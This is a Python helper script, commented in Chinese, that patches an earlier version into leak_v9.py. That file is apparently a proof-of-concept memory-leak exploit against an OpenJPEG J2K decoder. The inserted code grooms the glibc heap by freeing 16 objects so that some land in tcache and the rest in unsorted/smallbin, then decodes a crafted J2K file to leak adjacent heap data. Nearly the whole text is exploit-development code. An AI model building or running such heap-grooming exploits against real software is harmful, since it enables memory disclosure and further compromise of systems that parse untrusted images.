#!/usr/bin/env python3
# 由 leak_v8.py 生成 leak_v9.py（两处关键修正）：
#  A) 真正让 D 被释放：pairs 也持有 D，必须 del pairs，否则引用计数不减 ⇒ 无洞
#  B) 一次释放 16 个：tcache 每档只收 7 个，第 8 个起进 unsorted/smallbin
#     （tp_index 是 opj_calloc ⇒ _int_malloc ⇒ 看不到 tcache）
import ast, sys

s = open('/tmp/leak_v8.py').read()
s = s.replace('/tmp/leak_result8.txt', '/tmp/leak_result9.txt')
s = s.replace('/tmp/LEAK8.j2k', '/tmp/LEAK9.j2k')

old = """mid = gold[len(gold) // 2]
hole = mid[0]
print('[*] 释放的洞 = %#x，其上邻居 B = %#x' % (id(hole), id(mid[1])), flush=True)
del mid, gold
gc.collect()
del hole                                      # 只此一个洞
print('[*] 该档空闲块数应为 1', flush=True)"""

new = """nholes = 16
cand = [D for (D, B) in gold[:nholes]]
wantB = [hex(id(B)) for (D, B) in gold[:nholes]]
# blist 已在上面持有所有 B（活引用）；必须 del pairs，否则 D 引用计数不为 0 ⇒ 没有洞
del pairs, gold
gc.collect()
print('[*] 释放 %d 个洞（前 7 个进 tcache，第 8 个起进 unsorted/smallbin）' % len(cand), flush=True)
print('[*] 这些洞上方的活 B（前 3）=', wantB[:3], flush=True)
del cand
gc.collect()
print('[*] 洞已放好，开始解码', flush=True)"""

if old not in s:
    print('!! 锚点没找到'); sys.exit(1)
s = s.replace(old, new)
open('/tmp/leak_v9.py', 'w').write(s)
ast.parse(s)
print('ok: /tmp/leak_v9.py 生成且语法通过')